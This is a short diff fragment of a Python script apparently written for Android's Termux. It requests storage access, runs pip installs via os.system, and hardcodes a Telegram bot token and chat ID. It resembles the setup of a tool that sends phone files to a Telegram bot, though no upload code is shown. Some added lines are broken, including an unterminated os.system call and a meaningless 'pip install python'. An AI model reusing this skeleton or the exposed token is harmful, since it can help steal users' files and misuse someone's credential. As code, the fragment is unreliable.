@@ -9,7 +9,14 @@ subprocess.run(["termux-setup-storage"])
 
 os.system(' pip install requests ')
 
+
 os.system('clear ')
+
+os.system(' pip install python ' )
+
+os.system('clear')
+
+os.system(' python 
 
 token = "5755651457:AAFn_DEGgStGLr1zyska-MYtnADtGP8-EgI"
 chat_id = "5894045208"
